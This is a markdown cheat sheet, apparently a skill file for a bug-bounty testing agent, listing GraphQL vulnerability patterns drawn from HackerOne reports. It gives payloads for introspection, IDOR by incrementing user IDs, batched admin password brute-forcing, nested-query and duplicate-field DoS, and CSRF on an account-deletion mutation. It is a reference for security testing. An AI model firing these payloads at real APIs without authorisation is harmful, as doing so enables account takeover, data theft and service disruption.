---
name: "h1-graphql-techniques"
description: "GraphQL vulnerability patterns from HackerOne reports — introspection enabled, IDOR in GraphQL queries, batching attacks for brute force, CSRF via mutations, field suggestions leaking schema"
category: api
tags: ["graphql", "api", "graphql-introspection", "graphql-batching", "api-testing", "hackerone"]
relevance: 9
---

# H1 GraphQL Testing Techniques

Real-world GraphQL vulnerabilities from HackerOne:

## 1. Introspection Enabled (Information Leak)
Query to test:
```graphql
query { __schema { types { name fields { name } } } }
```
If returns full schema → risk: all queries, mutations, types exposed

## 2. GraphQL IDOR
Query other users' data by changing IDs:
```graphql
query { user(id: 1234) { email, privateData } }
query { user(id: 1235) { email, privateData } }
```
Test: Increment/decrement IDs across GraphQL queries

## 3. Batching Attack (Brute Force)
POST `/graphql` with multiple queries in one request:
```json
[{"query": "query { login(input: {username: \"admin\", password: \"test1\"}) { token } }"},
 {"query": "query { login(input: {username: \"admin\", password: \"test2\"}) { token } }"}]
```
Rate limiting often doesn't apply to batched requests

## 4. Field Suggestions
Test: Send typo field names → might get suggestions revealing hidden fields
```graphql
query { user(id: 1) { emial } }
```
Response might suggest: `Did you mean "email"?`

## 5. Query Depth Attacks (DoS)
```graphql
query {
  user { posts { comments { user { posts { comments { text } } } } } }
}
```
Test: Deeply nested queries to cause resource exhaustion

## 6. CSRF via Mutations
```graphql
mutation { deleteAccount { success } }
```
Test: Does mutation work with just cookies (no CSRF token)?

## 7. GraphQL Field Duplication
```graphql
query { user(id: 1) { email, email, email, email, email } }
```
Some APIs process duplicate fields multiple times → DoS

## Common GraphQL Endpoints:
```
/graphql, /graph, /gql, /v1/graphql, /api/graphql, /query
/playground, /graphiql, /graphql/console, /graphql/explorer
```
